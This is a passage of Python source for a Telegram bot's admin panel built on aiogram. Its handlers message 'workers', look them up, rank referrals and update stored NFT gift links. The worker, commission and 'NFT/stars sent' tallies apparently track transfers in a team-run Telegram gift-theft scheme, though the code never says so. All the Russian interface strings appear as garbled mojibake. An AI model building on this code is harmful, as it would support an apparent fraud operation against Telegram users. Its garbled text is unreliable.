        await message.answer("<b>‚ùå –ú–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å —Ç–æ–ª—å–∫–æ —Ç–µ–∫—Å—Ç!</b>", parse_mode="HTML")
        return

    await message.answer("<b>‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤–æ—Ä–∫–µ—Ä—É</b>", parse_mode="HTML")
    asyncio.create_task(_send_message_to_worker_bg(
        message.bot, worker_id, message.html_text or message.text, message.chat.id
    ))
    await state.clear()

async def _send_message_to_worker_bg(bot, worker_id, text, admin_id):
    try:
        await bot.send_message(
            chat_id=worker_id,
            text=text,
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[ERROR] –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤–æ—Ä–∫–µ—Ä—É {worker_id}: {e}")
        try:
            await bot.send_message(
                chat_id=admin_id,
                text=f"<b>‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤–æ—Ä–∫–µ—Ä—É <code>{worker_id}</code>:</b>\n<code>{e}</code>",
                parse_mode="HTML"
            )
        except Exception as e2:
            print(f"[ERROR] –ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –∞–¥–º–∏–Ω–∞ –æ –ø—Ä–æ–±–ª–µ–º–µ: {e2}")

@admin_router.callback_query(F.data == "search_worker")
async def ask_worker_ident(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "<b>–í–≤–µ–¥–∏ Telegram ID –∏–ª–∏ username –≤–æ—Ä–∫–µ—Ä–∞ –¥–ª—è –ø–æ–∏—Å–∫–∞:</b>",
        parse_mode="HTML"
    )
    await state.set_state(SearchWorkerState.waiting_for_worker_ident)
    await callback.answer()

@admin_router.message(SearchWorkerState.waiting_for_worker_ident)
async def process_search_worker(message: types.Message, state: FSMContext):
    ident = message.text.strip().lstrip('@')

    async with Session() as session:
        query = select(Admin)
        if ident.isdigit():
            query = query.where(Admin.telegram_id == int(ident))
        else:
            query = query.where(Admin.username.ilike(ident))
        worker = (await session.execute(query)).scalar_one_or_none()

        bots_text = ""
        if worker:
            bots = (await session.execute(
                select(WorkerBot).where(WorkerBot.owner_id == worker.id)
            )).scalars().all()
            if bots:
                bots_list = "\n".join([f"‚Ä¢ @{b.username or '-'}" for b in bots])
                bots_text = f"\n<b>ü§ñ –ë–æ—Ç—ã –≤–æ—Ä–∫–µ—Ä–∞:</b>\n{bots_list}"
            else:
                bots_text = "\n<b>ü§ñ –ë–æ—Ç—ã –≤–æ—Ä–∫–µ—Ä–∞:</b>\n- –ù–µ—Ç –±–æ—Ç–æ–≤"

            # —Å–æ–±–∏—Ä–∞–µ–º —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤ –∏ –∏—Ö —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
            referrals = (await session.execute(
                select(Admin).where(Admin.referred_by == worker.telegram_id)
            )).scalars().all()
            total_nft = sum(getattr(r, "gifts_unique_sent", 0) or 0 for r in referrals)
            total_stars = sum(getattr(r, "stars_sent", 0) or 0 for r in referrals)
            total_referrals = len(referrals)

    if not worker:
        await message.answer("<b>‚ùå –í–æ—Ä–∫–µ—Ä –Ω–µ –Ω–∞–π–¥–µ–Ω.</b>", parse_mode="HTML")
    else:
        text = (
            f"<b>üÜî</b> <code>{worker.telegram_id}</code>\n"
            f"<b>üîπ –¢—ç–≥: @{worker.username or '–Ω–µ—Ç'}</b>\n"
            f"<b>üìõ –ò–º—è: {worker.first_name or '-'}</b> <b>{worker.last_name or ''}</b>\n"
            f"<b>üí¨ –ù–∏–∫–Ω–µ–π–º: {worker.nickname or '-'}</b>\n"
            f"<b>üí∏ –ö–æ–º–∏—Å—Å–∏—è: {worker.commission_every}</b> | <b>–°—á—ë—Ç—á–∏–∫: {worker.commission_counter}</b>\n\n"
            f"<b>üìà –û–±—â–∞—è —Å—Ç–∞—Ç–∞:</b>\n"
            f"<b>üéÅ NFT: {worker.gifts_unique_sent}</b>\n"
            f"<b>üåü –ó–≤—ë–∑–¥: {worker.stars_sent}</b>\n\n"
            f"<b>üìä –ó–∞ —Å–µ–≥–æ–¥–Ω—è:</b>\n"
            f"<b>üéÅ NFT: {worker.daily_gifts_unique}</b>\n"
            f"<b>üåü –ó–≤—ë–∑–¥: {worker.daily_stars_sent}</b>\n\n"
            f"<b>üë• –†–µ—Ñ–µ—Ä–∞–ª–æ–≤:</b> <code>{total_referrals}</code>\n"
            f"<b>üéÜ NFT –æ—Ç —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤:</b> <code>{total_nft}</code> | <b>‚≠êÔ∏è –ó–≤—ë–∑–¥ –æ—Ç —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤:</b> <code>{total_stars}</code>\n"
            f"{bots_text}"
        )
        await message.answer(text, parse_mode="HTML")

    await state.clear()

@admin_router.callback_query(F.data.startswith("show_top_referrals"))
async def show_top_referrals(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    page = int(parts[1]) if len(parts) > 1 else 1

    async with Session() as session:
        # –ë–µ—Ä—ë–º –≤—Å–µ—Ö —É –∫–æ–≥–æ –µ—Å—Ç—å —Ö–æ—Ç—å –æ–¥–∏–Ω —Ä–µ—Ñ–µ—Ä–∞–ª (–ø–æ —Ñ–∞–∫—Ç—É, –∞ –Ω–µ –ø–æ –ø–æ–ª—é)
        admins = (await session.execute(select(Admin))).scalars().all()
        admins_stats = []

        for admin in admins:
            referrals = (await session.execute(
                select(Admin).where(Admin.referred_by == admin.telegram_id)
            )).scalars().all()
            if not referrals:
                continue  # –ø—Ä–æ–ø—É—Å–∫–∞–µ–º, –µ—Å–ª–∏ –Ω–µ—Ç —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤

            total_nft = sum(getattr(r, "gifts_unique_sent", 0) or 0 for r in referrals)
            total_stars = sum(getattr(r, "stars_sent", 0) or 0 for r in referrals)
            total_referrals = len(referrals)
            admins_stats.append({
                "admin": admin,
                "referrals_count": total_referrals,
                "total_nft": total_nft,
                "total_stars": total_stars
            })

        admins_stats.sort(key=lambda x: (x["total_nft"] + x["total_stars"]), reverse=True)

        total = len(admins_stats)
        pages = (total + TOP_REFERRALS_PER_PAGE - 1) // TOP_REFERRALS_PER_PAGE or 1
        page = max(1, min(page, pages))
        start = (page - 1) * TOP_REFERRALS_PER_PAGE
        end = start + TOP_REFERRALS_PER_PAGE
        page_admins = admins_stats[start:end]

        rows = []
        for idx, data in enumerate(page_admins, start=start + 1):
            admin = data["admin"]
            line = f"#{idx} {admin.telegram_id}"
            if admin.username:
                line += f" | @{admin.username}"
            line += (
                f"\n–†–µ—Ñ–µ—Ä–∞–ª–æ–≤: {data['referrals_count']}"
                f"\nNFT: {data['total_nft']} | –ó–≤—ë–∑–¥: {data['total_stars']}\n"
                + "-" * 30
            )
            rows.append(line)

        if not rows:
            text = "–¢–æ–ø —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤ –ø—É—Å—Ç."
        else:
            text = "üî• –¢–æ–ø —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤ –ø–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤—É –ø–µ—Ä–µ–≤–æ–¥–æ–≤ (NFT –∏ –∑–≤—ë–∑–¥—ã):\n\n" + "\n".join(rows)

    nav = [
        InlineKeyboardButton(text="‚¨ÖÔ∏è", callback_data=f"show_top_referrals:{page-1}" if page > 1 else "ignore"),
        InlineKeyboardButton(text=f"{page}/{pages}", callback_data="ignore"),
        InlineKeyboardButton(text="‚û°Ô∏è", callback_data=f"show_top_referrals:{page+1}" if page < pages else "ignore"),
    ]

    kb = InlineKeyboardMarkup(inline_keyboard=[nav])
    await callback.message.edit_text(text, reply_markup=kb)
    await callback.answer()

@admin_router.callback_query(F.data == "change_worker_status")
async def ask_worker_ident(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "<b>–í–≤–µ–¥–∏—Ç–µ Telegram ID –∏–ª–∏ username –≤–æ—Ä–∫–µ—Ä–∞, –∫–æ—Ç–æ—Ä–æ–º—É —Ö–æ—á–µ—à—å –∏–∑–º–µ–Ω–∏—Ç—å —Å—Ç–∞—Ç—É—Å:</b>",
        parse_mode="HTML"
    )
    await state.set_state(ChangeWorkerStatusState.waiting_for_worker_ident)
    await callback.answer()

@admin_router.message(ChangeWorkerStatusState.waiting_for_worker_ident)
async def ask_new_status(message: types.Message, state: FSMContext):
    ident = message.text.strip().lstrip('@')
    async with Session() as session:
        query = select(Admin)
        if ident.isdigit():
            query = query.where(Admin.telegram_id == int(ident))
        else:
            query = query.where(Admin.username.ilike(ident))
        admin = (await session.execute(query)).scalar_one_or_none()

    if not admin:
        await message.answer("<b>‚ùå –í–æ—Ä–∫–µ—Ä –Ω–µ –Ω–∞–π–¥–µ–Ω.</b>", parse_mode="HTML")
        await state.clear()
        return

    await state.update_data(worker_id=admin.id)

    await message.answer(
        f"<b>–¢–µ–∫—É—â–∏–π —Å—Ç–∞—Ç—É—Å –≤–æ—Ä–∫–µ—Ä–∞: <u>{admin.status or '–í–æ—Ä–∫–µ—Ä'}</u></b>\n\n"
        f"<b>–í–≤–µ–¥–∏ –Ω–æ–≤—ã–π —Å—Ç–∞—Ç—É—Å –¥–ª—è –≤–æ—Ä–∫–µ—Ä–∞:</b>",
        parse_mode="HTML"
    )
    await state.set_state(ChangeWorkerStatusState.waiting_for_new_status)

@admin_router.message(ChangeWorkerStatusState.waiting_for_new_status)
async def set_new_status(message: types.Message, state: FSMContext):
    new_status = message.text.strip()
    data = await state.get_data()
    worker_id = data.get("worker_id")

    async with Session() as session:
        admin = await session.get(Admin, worker_id)
        if not admin:
            await message.answer("<b>‚ùå –í–æ—Ä–∫–µ—Ä –Ω–µ –Ω–∞–π–¥–µ–Ω.</b>", parse_mode="HTML")
            await state.clear()
            return

        admin.status = new_status
        await session.commit()

    await message.answer(
        f"<b>‚úÖ –°—Ç–∞—Ç—É—Å –∏–∑–º–µ–Ω—ë–Ω:</b> <b>{new_status}</b>",
        parse_mode="HTML"
    )
    await state.clear()

@admin_router.callback_query(F.data == "add_nft_links")
async def ask_nft_links(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "<b>–ü—Ä–∏—à–ª–∏ –Ω–æ–≤—ã–µ NFT-—Å—Å—ã–ª–∫–∏ —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é –∏–ª–∏ —Å –Ω–æ–≤–æ–π —Å—Ç—Ä–æ–∫–∏ (—Å—Ç–∞—Ä—ã–µ –±—É–¥—É—Ç –∑–∞–º–µ–Ω–µ–Ω—ã!):</b>",
        parse_mode="HTML"
    )
    await state.set_state(AddNFTLinksState.waiting_for_links)
    await callback.answer()

@admin_router.message(AddNFTLinksState.waiting_for_links)
async def handle_nft_links(message: types.Message, state: FSMContext):
    raw = message.text.replace(",", "\n")
    links = [line.strip() for line in raw.splitlines() if line.strip()]
    links = [l for l in links if l.startswith("http")]

    if not links:
        await message.answer("<b>‚ùå –ù–µ—Ç –≤–∞–ª–∏–¥–Ω—ã—Ö —Å—Å—ã–ª–æ–∫. –ü–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞.</b>", parse_mode="HTML")
        return

    from sqlalchemy import delete
    async with Session() as session:
        await session.execute(delete(NFTGift))   
        await session.commit()
        for url in links:
            session.add(NFTGift(url=url))
        await session.commit()

    await message.answer(
        f"<b>‚úÖ –°—Å—ã–ª–∫–∏ –æ–±–Ω–æ–≤–ª–µ–Ω—ã! –í—Å–µ–≥–æ: {len(links)}</b>",
        parse_mode="HTML"
    )
    await state.clear()